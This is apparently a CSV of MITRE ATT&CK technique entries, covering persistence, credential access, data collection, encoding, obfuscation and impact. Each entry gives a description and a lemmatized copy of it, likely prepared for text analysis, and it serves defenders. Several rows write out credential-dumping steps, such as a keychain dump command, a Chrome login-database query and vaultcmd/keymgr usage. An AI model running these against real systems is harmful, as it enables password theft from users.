T1543.003,Create or Modify System Process: Windows Service,"Adversaries may create or modify Windows services to repeatedly execute malicious payloads as part of persistence. When Windows boots up, it starts programs or applications called services that perform background system functions. Windows service configuration information, including the file path to the service's executable or recovery programs/commands, is stored in the Windows Registry.Adversaries may install a new service or modify an existing service to execute at startup in order to persist on a system. Service configurations can be set or modified using system utilities (such as sc.exe), by directly modifying the Registry, or by interacting directly with the Windows API. Adversaries may also use services to install and execute malicious drivers. For example, after dropping a driver file (ex: .sys) to disk, the payload can be loaded and registered via Native API functions such as CreateServiceW() (or manually via functions such as ZwLoadDriver() and ZwSetValueKey()), by creating the required service Registry values (i.e. Modify Registry), or by using command-line utilities such as PnPUtil.exe.Services may be created with administrator privileges but are executed under SYSTEM privileges, so an adversary may also use a service to escalate privileges. Adversaries may also directly start services through Service Execution. To make detection analysis more challenging, malicious services may also incorporate Masquerade Task or Service (ex: using a service and/or payload name related to a legitimate OS or benign software component).",adversary create modify windows service repeatedly execute malicious payload persistence windows boot start program application call service perform background system function windows service configuration information include file path service executable recovery program command store windows registry adversary install new service modify exist service execute startup order persist system service configuration set modify system utility directly modify registry interact directly windows api adversary use service install execute malicious driver example drop driver file ex disk payload load register native api function createservicew manually function zwloaddriver zwsetvaluekey create required service registry value modify registry command line utility service create administrator privilege execute system privilege adversary use service escalate privilege adversary directly start service service execution detection analysis challenging malicious service incorporate masquerade task service ex service payload relate legitimate os benign software component
T1543.004,Create or Modify System Process: Launch Daemon,"Adversaries may create or modify Launch Daemons to execute malicious payloads as part of persistence. Launch Daemons are plist files used to interact with Launchd, the service management framework used by macOS. Launch Daemons require elevated privileges to install, are executed for every user on a system prior to login, and run in the background without the need for user interaction. During the macOS initialization startup, the launchd process loads the parameters for launch-on-demand system-level daemons from plist files found in /System/Library/LaunchDaemons/ and /Library/LaunchDaemons/. Required Launch Daemons parameters include a Label to identify the task, Program to provide a path to the executable, and RunAtLoad to specify when the task is run. Launch Daemons are often used to provide access to shared resources, updates to software, or conduct automation tasks.Adversaries may install a Launch Daemon configured to execute at startup by using the RunAtLoad parameter set to true and the Program parameter set to the malicious executable path. The daemon name may be disguised by using a name from a related operating system or benign software (i.e. Masquerading). When the Launch Daemon is executed, the program inherits administrative permissions.Additionally, system configuration changes (such as the installation of third party package managing software) may cause folders such as usr/local/bin to become globally writeable. So, it is possible for poor configurations to allow an adversary to modify executables referenced by current Launch Daemon's plist files.",adversary create modify launch daemons execute malicious payload persistence launch daemons plist file interact launchd service management framework macos launch daemons require elevated privilege install execute user system prior login run background need user interaction macos initialization startup launchd process load parameter launch demand system level daemon plist file find library required launch daemons parameter include label identify task program provide path executable runatload specify task run launch daemons provide access share resource update software conduct automation task adversary install launch daemon configure execute startup runatload parameter set true program parameter set malicious executable path daemon disguise related operate system benign software masquerading launch daemon execute program inherit administrative permission additionally system configuration change installation party package manage software cause folder usr local bin globally writeable possible poor configuration allow adversary modify executable reference current launch daemon plist file
T1555,Credentials from Password Stores,"Adversaries may search for common password storage locations to obtain user credentials. Passwords are stored in several places on a system, depending on the operating system or application holding the credentials. There are also specific applications that store passwords to make it easier for users manage and maintain. Once credentials are obtained, they can be used to perform lateral movement and access restricted information.",adversary search common password storage location obtain user credential password store place system depend operate system application hold credential specific application store password easy user manage maintain credential obtain perform lateral movement access restricted information
T1555.001,Credentials from Password Stores: Keychain,"Adversaries may acquire credentials from Keychain. Keychain (or Keychain Services) is the macOS credential management system that stores account names, passwords, private keys, certificates, sensitive application data, payment data, and secure notes. There are three types of Keychains: Login Keychain, System Keychain, and Local Items (iCloud) Keychain. The default Keychain is the Login Keychain, which stores user passwords and information. The System Keychain stores items accessed by the operating system, such as items shared among users on a host. The Local Items (iCloud) Keychain is used for items synced with Apple’s iCloud service. Keychains can be viewed and edited through the Keychain Access application or using the command-line utility security. Keychain files are located in ~/Library/Keychains/, /Library/Keychains/, and /Network/Library/Keychains/.Adversaries may gather user credentials from Keychain storage/memory. For example, the command security dump-keychain –d will dump all Login Keychain credentials from ~/Library/Keychains/login.keychain-db. Adversaries may also directly read Login Keychain credentials from the ~/Library/Keychains/login.keychain file. Both methods require a password, where the default password for the Login Keychain is the current user’s password to login to the macOS host.",adversary acquire credential keychain keychain keychain services macos credential management system store account name password private key certificate sensitive application datum payment datum secure note type keychains login keychain system keychain local items icloud keychain default keychain login keychain store user password information system keychain store item access operate system item share user host local item icloud keychain item sync apple icloud service keychains view edit keychain access application command line utility security keychain file locate library gather user credential keychain storage memory example command security dump keychain d dump login keychain credential keychains db adversary directly read login keychain credential keychains file method require password default password login keychain current user password login macos host
T1555.002,Credentials from Password Stores: Securityd Memory,"An adversary may obtain root access (allowing them to read securityd’s memory), then they can scan through memory to find the correct sequence of keys in relatively few tries to decrypt the user’s logon keychain. This provides the adversary with all the plaintext passwords for users, WiFi, mail, browsers, certificates, secure notes, etc.In OS X prior to El Capitan, users with root access can read plaintext keychain passwords of logged-in users because Apple’s keychain implementation allows these credentials to be cached so that users are not repeatedly prompted for passwords.",adversary obtain root access allow read securityd memory scan memory find correct sequence key relatively try decrypt user logon keychain provide adversary plaintext password user wifi mail browser certificate secure note etc os x prior el capitan user root access read plaintext keychain password log user apple keychain implementation allow credential cache user repeatedly prompt password
T1555.003,Credentials from Password Stores: Credentials from Web Browsers,"Adversaries may acquire credentials from web browsers by reading files specific to the target browser. Web browsers commonly save credentials such as website usernames and passwords so that they do not need to be entered manually in the future. Web browsers typically store the credentials in an encrypted format within a credential store; however, methods exist to extract plaintext credentials from web browsers.For example, on Windows systems, encrypted credentials may be obtained from Google Chrome by reading a database file, AppData\Local\Google\Chrome\User Data\Default\Login Data and executing a SQL query: SELECT action_url, username_value, password_value FROM logins;. The plaintext password can then be obtained by passing the encrypted credentials to the Windows API function CryptUnprotectData, which uses the victim’s cached logon credentials as the decryption key.Adversaries have executed similar procedures for common web browsers such as FireFox, Safari, Edge, etc. Windows stores Internet Explorer and Microsoft Edge credentials in Credential Lockers managed by the Windows Credential Manager.Adversaries may also acquire credentials by searching web browser process memory for patterns that commonly match credentials.After acquiring credentials from web browsers, adversaries may attempt to recycle the credentials across different systems and/or accounts in order to expand access. This can result in significantly furthering an adversary's objective in cases where credentials gained from web browsers overlap with privileged accounts (e.g. domain administrator).",adversary acquire credential web browser read file specific target browser web browser commonly save credential website username password need enter manually future web browser typically store credential encrypted format credential store method exist extract plaintext credential web browser example windows system encrypt credential obtain google chrome read database file data execute sql query select login plaintext password obtain pass encrypt credential windows api function cryptunprotectdata use victim cache logon credential decryption key adversary execute similar procedure common web browser firefox safari edge etc windows store internet explorer microsoft edge credential credential lockers manage windows credential manager adversary acquire credential search web browser process memory pattern commonly match credential acquire credential web browser adversary attempt recycle credential different system account order expand access result significantly further adversary objective case credential gain web browser overlap privileged account domain administrator
T1555.004,Credentials from Password Stores: Windows Credential Manager,"Adversaries may acquire credentials from the Windows Credential Manager. The Credential Manager stores credentials for signing into websites, applications, and/or devices that request authentication through NTLM or Kerberos in Credential Lockers (previously known as Windows Vaults).The Windows Credential Manager separates website credentials from application or network credentials in two lockers. As part of Credentials from Web Browsers, Internet Explorer and Microsoft Edge website credentials are managed by the Credential Manager and are stored in the Web Credentials locker. Application and network credentials are stored in the Windows Credentials locker.Credential Lockers store credentials in encrypted .vcrd files, located under %Systemdrive%\Users\\Adversaries may list credentials managed by the Windows Credential Manager through several mechanisms. vaultcmd.exe is a native Windows executable that can be used to enumerate credentials stored in the Credential Locker through a command-line interface. Adversaries may also gather credentials by directly reading files located inside of the Credential Lockers. Windows APIs, such as CredEnumerateA, may also be absued to list credentials managed by the Credential Manager.Adversaries may also obtain credentials from credential backups. Credential backups and restorations may be performed by running rundll32.exe keymgr.dll KRShowKeyMgr then selecting the ""Back up..."" button on the ""Stored User Names and Passwords"" GUI.Password recovery tools may also obtain plain text passwords from the Credential Manager.",adversary acquire credential windows credential manager credential manager store credential sign website application device request authentication ntlm kerberos credential lockers previously know windows windows credential manager separate website credential application network credential locker credentials web browsers internet explorer microsoft edge website credential manage credential manager store web credentials locker application network credential store windows credentials locker credential lockers store credential encrypt file locate list credential manage windows credential manager mechanism native windows executable enumerate credential store credential locker command line interface adversary gather credential directly read file locate inside credential lockers windows api credenumeratea absue list credential manage credential manager adversary obtain credential credential backup credential backup restoration perform run krshowkeymgr select button store user names passwords recovery tool obtain plain text password credential manager
T1555.005,Credentials from Password Stores: Password Managers,Adversaries may acquire user credentials from third-party password managers.Adversaries may acquire user credentials from password managers by extracting the master password and/or plain-text credentials from memory.,adversary acquire user credential party password manager adversary acquire user credential password manager extract master password plain text credential memory
T1485,Data Destruction,"Adversaries may destroy data and files on specific systems or in large numbers on a network to interrupt availability to systems, services, and network resources. Data destruction is likely to render stored data irrecoverable by forensic techniques through overwriting files or data on local and remote drives. Common operating system file deletion commands such as del and rm often only remove pointers to files without wiping the contents of the files themselves, making the files recoverable by proper forensic methodology. This behavior is distinct from Disk Content Wipe and Disk Structure Wipe because individual files are destroyed rather than sections of a storage disk or the disk's logical structure.Adversaries may attempt to overwrite files and directories with randomly generated data to make it irrecoverable.To maximize impact on the target organization in operations where network-wide availability interruption is the goal, malware designed for destroying data may have worm-like features to propagate across a network by leveraging additional techniques like Valid Accounts, OS Credential Dumping, and SMB/Windows Admin Shares..In cloud environments, adversaries may leverage access to delete cloud storage, cloud storage accounts, machine images, and other infrastructure crucial to operations to damage an organization or their customers.",adversary destroy datum file specific system large number network interrupt availability system service network resource datum destruction likely render store datum irrecoverable forensic technique overwrite file datum local remote drive common operate system file deletion command del rm remove pointer file wipe content file make file recoverable proper forensic methodology behavior distinct disk content wipe disk structure wipe individual file destroy section storage disk disk logical structure adversary attempt overwrite file directory randomly generate datum irrecoverable maximize impact target organization operation network wide availability interruption goal malware design destroy datum worm like feature propagate network leverage additional technique like valid accounts os credential dumping smb windows admin share cloud environment adversary leverage access delete cloud storage cloud storage account machine image infrastructure crucial operation damage organization customer
T1132,Data Encoding,"Adversaries may encode data to make the content of command and control traffic more difficult to detect. Command and control (C2) information can be encoded using a standard data encoding system. Use of data encoding may adhere to existing protocol specifications and includes use of ASCII, Unicode, Base64, MIME, or other binary-to-text and character encoding systems. Some data encoding systems may also result in data compression, such as gzip.",adversary encode datum content command control traffic difficult detect command control information encode standard datum encoding system use datum encoding adhere existing protocol specification include use ascii unicode mime binary text character encoding system datum encoding system result datum compression gzip
T1132.001,Data Encoding: Standard Encoding,"Adversaries may encode data with a standard data encoding system to make the content of command and control traffic more difficult to detect. Command and control (C2) information can be encoded using a standard data encoding system that adheres to existing protocol specifications. Common data encoding schemes include ASCII, Unicode, hexadecimal, Base64, and MIME. Some data encoding systems may also result in data compression, such as gzip.",adversary encode datum standard datum encode system content command control traffic difficult detect command control information encode standard data encode system adhere existing protocol specification common datum encoding scheme include ascii unicode hexadecimal mime data encode system result datum compression gzip
T1132.002,Data Encoding: Non-Standard Encoding,"Adversaries may encode data with a non-standard data encoding system to make the content of command and control traffic more difficult to detect. Command and control (C2) information can be encoded using a non-standard data encoding system that diverges from existing protocol specifications. Non-standard data encoding schemes may be based on or related to standard data encoding schemes, such as a modified Base64 encoding for the message body of an HTTP request.",adversary encode datum non standard data encoding system content command control traffic difficult detect command control information encode non standard data encoding system diverge existing protocol specification non standard datum encoding scheme base relate standard datum encoding scheme modify encoding message body http request
T1486,Data Encrypted for Impact,"Adversaries may encrypt data on target systems or on large numbers of systems in a network to interrupt availability to system and network resources. They can attempt to render stored data inaccessible by encrypting files or data on local and remote drives and withholding access to a decryption key. This may be done in order to extract monetary compensation from a victim in exchange for decryption or a decryption key (ransomware) or to render data permanently inaccessible in cases where the key is not saved or transmitted.In the case of ransomware, it is typical that common user files like Office documents, PDFs, images, videos, audio, text, and source code files will be encrypted (and often renamed and/or tagged with specific file markers). Adversaries may need to first employ other behaviors, such as File and Directory Permissions Modification or System Shutdown/Reboot, in order to unlock and/or gain access to manipulate these files. To maximize impact on the target organization, malware designed for encrypting data may have worm-like features to propagate across a network by leveraging other attack techniques like Valid Accounts, OS Credential Dumping, and SMB/Windows Admin Shares.In cloud environments, storage objects within compromised accounts may also be encrypted.",adversary encrypt datum target system large number system network interrupt availability system network resource attempt render store datum inaccessible encrypt file datum local remote drive withhold access decryption key order extract monetary compensation victim exchange decryption decryption key ransomware render datum permanently inaccessible case key save transmit case ransomware typical common user file like office document pdf image video audio text source code file encrypt rename tag specific file marker adversary need employ behavior file directory permissions modification system shutdown reboot order unlock gain access manipulate file maximize impact target organization malware design encrypt datum worm like feature propagate network leverage attack technique like valid accounts os credential dumping smb windows admin share cloud environment storage object compromise account encrypt
T1530,Data from Cloud Storage,"Adversaries may access data from improperly secured cloud storage.Many cloud service providers offer solutions for online data object storage such as Amazon S3, Azure Storage, and Google Cloud Storage. These solutions differ from other storage solutions (such as SQL or Elasticsearch) in that there is no overarching application. Data from these solutions can be retrieved directly using the cloud provider's APIs. In other cases, SaaS application providers such as Slack, Confluence, and Salesforce also provide cloud storage solutions as a peripheral use case of their platform. These cloud objects can be extracted directly from their associated application.Adversaries may collect sensitive data from these cloud storage solutions. Providers typically offer security guides to help end users configure systems, though misconfigurations are a common problem. There have been numerous incidents where cloud storage has been improperly secured, typically by unintentionally allowing public access to unauthenticated users, overly-broad access by all users, or even access for any anonymous person outside the control of the Identity Access Management system without even needing basic user permissions.This open access may expose various types of sensitive data, such as credit cards, personally identifiable information, or medical records.Adversaries may also obtain then abuse leaked credentials from source repositories, logs, or other means as a way to gain access to cloud storage objects.",adversary access datum improperly secure cloud storage cloud service provider offer solution online datum object storage amazon azure storage google cloud storage solution differ storage solution sql elasticsearch overarching application datum solution retrieve directly cloud provider api case saas application provider slack confluence salesforce provide cloud storage solution peripheral use case platform cloud object extract directly associate application adversary collect sensitive datum cloud storage solution provider typically offer security guide help end user configure system misconfiguration common problem numerous incident cloud storage improperly secure typically unintentionally allow public access unauthenticated user overly broad access user access anonymous person outside control identity access management system need basic user permission open access expose type sensitive datum credit card personally identifiable information medical record adversary obtain abuse leak credential source repository log mean way gain access cloud storage object
T1602,Data from Configuration Repository,"Adversaries may collect data related to managed devices from configuration repositories. Configuration repositories are used by management systems in order to configure, manage, and control data on remote systems. Configuration repositories may also facilitate remote access and administration of devices.Adversaries may target these repositories in order to collect large quantities of sensitive system administration data. Data from configuration repositories may be exposed by various protocols and software and can store a wide variety of data, much of which may align with adversary Discovery objectives.",adversary collect datum relate manage device configuration repository configuration repository management system order configure manage control datum remote system configuration repository facilitate remote access administration device adversary target repository order collect large quantity sensitive system administration datum datum configuration repository expose protocol software store wide variety datum align adversary discovery objective
T1602.001,Data from Configuration Repository: SNMP (MIB Dump),"Adversaries may target the Management Information Base (MIB) to collect and/or mine valuable information in a network managed using Simple Network Management Protocol (SNMP).The MIB is a configuration repository that stores variable information accessible via SNMP in the form of object identifiers (OID). Each OID identifies a variable that can be read or set and permits active management tasks, such as configuration changes, through remote modification of these variables. SNMP can give administrators great insight in their systems, such as, system information, description of hardware, physical location, and software packages. The MIB may also contain device operational information, including running configuration, routing table, and interface details.Adversaries may use SNMP queries to collect MIB content directly from SNMP-managed devices in order to collect network information that allows the adversary to build network maps and facilitate future targeted exploitation.",adversary target management information base mib collect valuable information network manage simple network management protocol mib configuration repository store variable information accessible snmp form object identifier oid oid identify variable read set permit active management task configuration change remote modification variable snmp administrator great insight system system information description hardware physical location software package mib contain device operational information include running configuration routing table interface detail adversary use snmp query collect mib content directly snmp manage device order collect network information allow adversary build network map facilitate future target exploitation
T1602.002,Data from Configuration Repository: Network Device Configuration Dump,"Adversaries may access network configuration files to collect sensitive data about the device and the network. The network configuration is a file containing parameters that determine the operation of the device. The device typically stores an in-memory copy of the configuration while operating, and a separate configuration on non-volatile storage to load after device reset. Adversaries can inspect the configuration files to reveal information about the target network and its layout, the network device and its software, or identifying legitimate accounts and credentials for later use.Adversaries can use common management tools and protocols, such as Simple Network Management Protocol (SNMP) and Smart Install (SMI), to access network configuration files. These tools may be used to query specific data from a configuration repository or configure the device to export the configuration for later analysis.",adversary access network configuration file collect sensitive datum device network network configuration file contain parameter determine operation device device typically store memory copy configuration operate separate configuration non volatile storage load device reset adversary inspect configuration file reveal information target network layout network device software identify legitimate account credential later use adversary use common management tool protocol simple network management protocol snmp smart install smi access network configuration file tool query specific datum configuration repository configure device export configuration later analysis
T1213,Data from Information Repositories,"Adversaries may leverage information repositories to mine valuable information. Information repositories are tools that allow for storage of information, typically to facilitate collaboration or information sharing between users, and can store a wide variety of data that may aid adversaries in further objectives, or direct access to the target information. Adversaries may also abuse external sharing features to share sensitive documents with recipients outside of the organization. The following is a brief list of example information that may hold potential value to an adversary and may also be found on an information repository:Policies, procedures, and standards Physical / logical network diagrams System architecture diagrams Technical system documentation Testing / development credentials Work / project schedules Source code snippets Links to network shares and other internal resourcesInformation stored in a repository may vary based on the specific instance or environment. Specific common information repositories include web-based platforms such as Sharepoint and Confluence, specific services such as Code Repositories, IaaS databases, enterprise databases, and other storage infrastructure such as SQL Server.",adversary leverage information repository valuable information information repository tool allow storage information typically facilitate collaboration information sharing user store wide variety datum aid adversary objective direct access target information adversary abuse external sharing feature share sensitive document recipient outside organization follow brief list example information hold potential value adversary find information repository policy procedure standard physical logical network diagram system architecture diagram technical system documentation testing development credential work project schedule source code snippet link network share internal resourcesinformation store repository vary base specific instance environment specific common information repository include web base platform sharepoint confluence specific service code repositories iaas database enterprise database storage infrastructure sql server
T1213.001,Data from Information Repositories: Confluence,"Adversaries may leverage Confluence repositories to mine valuable information. Often found in development environments alongside Atlassian JIRA, Confluence is generally used to store development-related documentation, however, in general may contain more diverse categories of useful information, such as:Policies, procedures, and standards Physical / logical network diagrams System architecture diagrams Technical system documentation Testing / development credentials Work / project schedules Source code snippets Links to network shares and other internal resources",adversary leverage confluence repository valuable information find development environment alongside atlassian jira confluence generally store development relate documentation general contain diverse category useful information policy procedure standard physical logical network diagram system architecture diagram technical system documentation testing development credential work project schedule source code snippet link network share internal resource
T1213.002,Data from Information Repositories: Sharepoint,"Adversaries may leverage the SharePoint repository as a source to mine valuable information. SharePoint will often contain useful information for an adversary to learn about the structure and functionality of the internal network and systems. For example, the following is a list of example information that may hold potential value to an adversary and may also be found on SharePoint:Policies, procedures, and standards Physical / logical network diagrams System architecture diagrams Technical system documentation Testing / development credentials Work / project schedules Source code snippets Links to network shares and other internal resources",adversary leverage sharepoint repository source valuable information sharepoint contain useful information adversary learn structure functionality internal network system example follow list example information hold potential value adversary find sharepoint policy procedure standard physical logical network diagram system architecture diagram technical system documentation testing development credential work project schedule source code snippet link network share internal resource
T1213.003,Data from Information Repositories: Code Repositories,"Adversaries may leverage code repositories to collect valuable information. Code repositories are tools/services that store source code and automate software builds. They may be hosted internally or privately on third party sites such as Github, GitLab, SourceForge, and BitBucket. Users typically interact with code repositories through a web application or command-line utilities such as git.Once adversaries gain access to a victim network or a private code repository, they may collect sensitive information such as proprietary source code or credentials contained within software's source code. Having access to software's source code may allow adversaries to develop Exploits, while credentials may provide access to additional resources using Valid Accounts.Note: This is distinct from Code Repositories, which focuses on conducting Reconnaissance via public code repositories.",adversary leverage code repository collect valuable information code repository tool service store source code automate software build host internally privately party site github gitlab sourceforge bitbucket user typically interact code repository web application command line utility git adversary gain access victim network private code repository collect sensitive information proprietary source code credential contain software source code have access software source code allow adversary develop exploits credential provide access additional resource valid accounts note distinct code repositories focus conduct reconnaissance public code repository
T1005,Data from Local System,"Adversaries may search local system sources, such as file systems and configuration files or local databases, to find files of interest and sensitive data prior to Exfiltration.Adversaries may do this using a Command and Scripting Interpreter, such as cmd as well as a Network Device CLI, which have functionality to interact with the file system to gather information. Adversaries may also use Automated Collection on the local system.",adversary search local system source file system configuration file local database find file interest sensitive datum prior exfiltration adversary command scripting interpreter cmd network device cli functionality interact file system gather information adversary use automated collection local system
T1039,Data from Network Shared Drive,"Adversaries may search network shares on computers they have compromised to find files of interest. Sensitive data can be collected from remote systems via shared network drives (host shared directory, network file server, etc.) that are accessible from the current system prior to Exfiltration. Interactive command shells may be in use, and common functionality within cmd may be used to gather information.",adversary search network share computer compromise find file interest sensitive datum collect remote system share network drive host share directory network file server etc accessible current system prior exfiltration interactive command shell use common functionality cmd gather information
T1025,Data from Removable Media,"Adversaries may search connected removable media on computers they have compromised to find files of interest. Sensitive data can be collected from any removable media (optical disk drive, USB memory, etc.) connected to the compromised system prior to Exfiltration. Interactive command shells may be in use, and common functionality within cmd may be used to gather information. Some adversaries may also use Automated Collection on removable media.",adversary search connect removable medium computer compromise find file interest sensitive datum collect removable medium optical disk drive usb memory etc connect compromise system prior exfiltration interactive command shell use common functionality cmd gather information adversary use automated collection removable medium
T1565,Data Manipulation,"Adversaries may insert, delete, or manipulate data in order to influence external outcomes or hide activity, thus threatening the integrity of the data. By manipulating data, adversaries may attempt to affect a business process, organizational understanding, or decision making.The type of modification and the impact it will have depends on the target application and process as well as the goals and objectives of the adversary. For complex systems, an adversary would likely need special expertise and possibly access to specialized software related to the system that would typically be gained through a prolonged information gathering campaign in order to have the desired impact.",adversary insert delete manipulate datum order influence external outcome hide activity threaten integrity datum manipulate datum adversary attempt affect business process organizational understanding decision making type modification impact depend target application process goal objective adversary complex system adversary likely need special expertise possibly access specialized software relate system typically gain prolonged information gathering campaign order desire impact
T1565.001,Data Manipulation: Stored Data Manipulation,"Adversaries may insert, delete, or manipulate data at rest in order to influence external outcomes or hide activity, thus threatening the integrity of the data. By manipulating stored data, adversaries may attempt to affect a business process, organizational understanding, and decision making.Stored data could include a variety of file formats, such as Office files, databases, stored emails, and custom file formats. The type of modification and the impact it will have depends on the type of data as well as the goals and objectives of the adversary. For complex systems, an adversary would likely need special expertise and possibly access to specialized software related to the system that would typically be gained through a prolonged information gathering campaign in order to have the desired impact.",adversary insert delete manipulate datum rest order influence external outcome hide activity threaten integrity datum manipulate store datum adversary attempt affect business process organizational understanding decision making store datum include variety file format office file database store email custom file format type modification impact depend type datum goal objective adversary complex system adversary likely need special expertise possibly access specialized software relate system typically gain prolonged information gathering campaign order desire impact
T1565.002,Data Manipulation: Transmitted Data Manipulation,"Adversaries may alter data en route to storage or other systems in order to manipulate external outcomes or hide activity, thus threatening the integrity of the data. By manipulating transmitted data, adversaries may attempt to affect a business process, organizational understanding, and decision making.Manipulation may be possible over a network connection or between system processes where there is an opportunity deploy a tool that will intercept and change information. The type of modification and the impact it will have depends on the target transmission mechanism as well as the goals and objectives of the adversary. For complex systems, an adversary would likely need special expertise and possibly access to specialized software related to the system that would typically be gained through a prolonged information gathering campaign in order to have the desired impact.",adversary alter datum en route storage system order manipulate external outcome hide activity threaten integrity datum manipulate transmit datum adversary attempt affect business process organizational understanding decision making manipulation possible network connection system process opportunity deploy tool intercept change information type modification impact depend target transmission mechanism goal objective adversary complex system adversary likely need special expertise possibly access specialized software relate system typically gain prolonged information gathering campaign order desire impact
T1565.003,Data Manipulation: Runtime Data Manipulation,"Adversaries may modify systems in order to manipulate the data as it is accessed and displayed to an end user, thus threatening the integrity of the data. By manipulating runtime data, adversaries may attempt to affect a business process, organizational understanding, and decision making.Adversaries may alter application binaries used to display data in order to cause runtime manipulations. Adversaries may also conduct Change Default File Association and Masquerading to cause a similar effect. The type of modification and the impact it will have depends on the target application and process as well as the goals and objectives of the adversary. For complex systems, an adversary would likely need special expertise and possibly access to specialized software related to the system that would typically be gained through a prolonged information gathering campaign in order to have the desired impact.",adversary modify system order manipulate datum access display end user threaten integrity datum manipulate runtime datum adversary attempt affect business process organizational understanding decision making adversary alter application binary display datum order cause runtime manipulation adversary conduct change default file association masquerade cause similar effect type modification impact depend target application process goal objective adversary complex system adversary likely need special expertise possibly access specialized software relate system typically gain prolonged information gathering campaign order desire impact
T1001,Data Obfuscation,"Adversaries may obfuscate command and control traffic to make it more difficult to detect. Command and control (C2) communications are hidden (but not necessarily encrypted) in an attempt to make the content more difficult to discover or decipher and to make the communication less conspicuous and hide commands from being seen. This encompasses many methods, such as adding junk data to protocol traffic, using steganography, or impersonating legitimate protocols.",adversary obfuscate command control traffic difficult detect command control communication hide necessarily encrypt attempt content difficult discover decipher communication conspicuous hide command see encompass method add junk datum protocol traffic steganography impersonate legitimate protocol
T1001.001,Data Obfuscation: Junk Data,"Adversaries may add junk data to protocols used for command and control to make detection more difficult. By adding random or meaningless data to the protocols used for command and control, adversaries can prevent trivial methods for decoding, deciphering, or otherwise analyzing the traffic. Examples may include appending/prepending data with junk characters or writing junk characters between significant characters.",adversary add junk datum protocol command control detection difficult add random meaningless datum protocol command control adversary prevent trivial method decode decipher analyze traffic example include append prepende datum junk character write junk character significant character
T1001.002,Data Obfuscation: Steganography,"Adversaries may use steganographic techniques to hide command and control traffic to make detection efforts more difficult. Steganographic techniques can be used to hide data in digital messages that are transferred between systems. This hidden information can be used for command and control of compromised systems. In some cases, the passing of files embedded using steganography, such as image or document files, can be used for command and control.",adversary use steganographic technique hide command control traffic detection effort difficult steganographic technique hide datum digital message transfer system hidden information command control compromised system case passing file embed steganography image document file command control
T1001.003,Data Obfuscation: Protocol Impersonation,"Adversaries may impersonate legitimate protocols or web service traffic to disguise command and control activity and thwart analysis efforts. By impersonating legitimate protocols or web services, adversaries can make their command and control traffic blend in with legitimate network traffic. Adversaries may impersonate a fake SSL/TLS handshake to make it look like subsequent traffic is SSL/TLS encrypted, potentially interfering with some security tooling, or to make the traffic look like it is related with a trusted entity.",adversary impersonate legitimate protocol web service traffic disguise command control activity thwart analysis effort impersonate legitimate protocol web service adversary command control traffic blend legitimate network traffic adversary impersonate fake ssl tls handshake look like subsequent traffic ssl tls encrypt potentially interfere security tooling traffic look like relate trust entity
T1074,Data Staged,"Adversaries may stage collected data in a central location or directory prior to Exfiltration. Data may be kept in separate files or combined into one file through techniques such as Archive Collected Data. Interactive command shells may be used, and common functionality within cmd and bash may be used to copy data into a staging location.In cloud environments, adversaries may stage data within a particular instance or virtual machine before exfiltration. An adversary may Create Cloud Instance and stage data in that instance.Adversaries may choose to stage data from a victim network in a centralized location prior to Exfiltration to minimize the number of connections made to their C2 server and better evade detection.",adversary stage collect datum central location directory prior exfiltration datum keep separate file combine file technique archive collected data interactive command shell common functionality cmd bash copy datum staging location cloud environment adversary stage datum particular instance virtual machine exfiltration adversary create cloud instance stage datum instance adversary choose stage datum victim network centralized location prior exfiltration minimize number connection server well evade detection
T1074.001,Data Staged: Local Data Staging,"Adversaries may stage collected data in a central location or directory on the local system prior to Exfiltration. Data may be kept in separate files or combined into one file through techniques such as Archive Collected Data. Interactive command shells may be used, and common functionality within cmd and bash may be used to copy data into a staging location.Adversaries may also stage collected data in various available formats/locations of a system, including local storage databases/repositories or the Windows Registry.",adversary stage collect datum central location directory local system prior exfiltration datum keep separate file combine file technique archive collected data interactive command shell common functionality cmd bash copy datum stage location adversary stage collect datum available format location system include local storage database repository windows registry
T1074.002,Data Staged: Remote Data Staging,"Adversaries may stage data collected from multiple systems in a central location or directory on one system prior to Exfiltration. Data may be kept in separate files or combined into one file through techniques such as Archive Collected Data. Interactive command shells may be used, and common functionality within cmd and bash may be used to copy data into a staging location.In cloud environments, adversaries may stage data within a particular instance or virtual machine before exfiltration. An adversary may Create Cloud Instance and stage data in that instance.By staging data on one system prior to Exfiltration, adversaries can minimize the number of connections made to their C2 server and better evade detection.",adversary stage datum collect multiple system central location directory system prior exfiltration datum keep separate file combine file technique archive collected data interactive command shell common functionality cmd bash copy datum staging location cloud environment adversary stage datum particular instance virtual machine exfiltration adversary create cloud instance stage datum instance stage datum system prior exfiltration adversary minimize number connection server well evade detection
T1030,Data Transfer Size Limits,An adversary may exfiltrate data in fixed size chunks instead of whole files or limit packet sizes below certain thresholds. This approach may be used to avoid triggering network data transfer threshold alerts.,adversary exfiltrate datum fix size chunk instead file limit packet size certain threshold approach avoid trigger network datum transfer threshold alert
T1622,Debugger Evasion,"Adversaries may employ various means to detect and avoid debuggers. Debuggers are typically used by defenders to trace and/or analyze the execution of potential malware payloads.Debugger evasion may include changing behaviors based on the results of the checks for the presence of artifacts indicative of a debugged environment. Similar to Virtualization/Sandbox Evasion, if the adversary detects a debugger, they may alter their malware to disengage from the victim or conceal the core functions of the implant. They may also search for debugger artifacts before dropping secondary or additional payloads.Specific checks will vary based on the target and/or adversary, but may involve Native API function calls such as IsDebuggerPresent() and NtQueryInformationProcess(), or manually checking the BeingDebugged flag of the Process Environment Block (PEB). Other checks for debugging artifacts may also seek to enumerate hardware breakpoints, interrupt assembly opcodes, time checks, or measurements if exceptions are raised in the current process (assuming a present debugger would ""swallow"" or handle the potential error).Adversaries may use the information learned from these debugger checks during automated discovery to shape follow-on behaviors. Debuggers can also be evaded by detaching the process or flooding debug logs with meaningless data via messages produced by looping Native API function calls such as OutputDebugStringW().",adversary employ mean detect avoid debugger debugger typically defender trace analyze execution potential malware payload debugger evasion include change behavior base result check presence artifact indicative debug environment similar virtualization sandbox evasion adversary detect debugger alter malware disengage victim conceal core function implant search debugger artifact drop secondary additional payload specific check vary base target adversary involve native api function call isdebuggerpresent ntqueryinformationprocess manually check beingdebugged flag process environment block peb check debug artifact seek enumerate hardware breakpoint interrupt assembly opcode time check measurement exception raise current process assume present debugger swallow handle potential use information learn debugger check automate discovery shape follow behavior debugger evade detach process flood debug log meaningless datum message produce loop native api function call outputdebugstringw
T1491,Defacement,"Adversaries may modify visual content available internally or externally to an enterprise network, thus affecting the integrity of the original content. Reasons for Defacement include delivering messaging, intimidation, or claiming (possibly false) credit for an intrusion. Disturbing or offensive images may be used as a part of Defacement in order to cause user discomfort, or to pressure compliance with accompanying messages.",adversary modify visual content available internally externally enterprise network affect integrity original content reason defacement include deliver messaging intimidation claim possibly false credit intrusion disturbing offensive image defacement order cause user discomfort pressure compliance accompany message
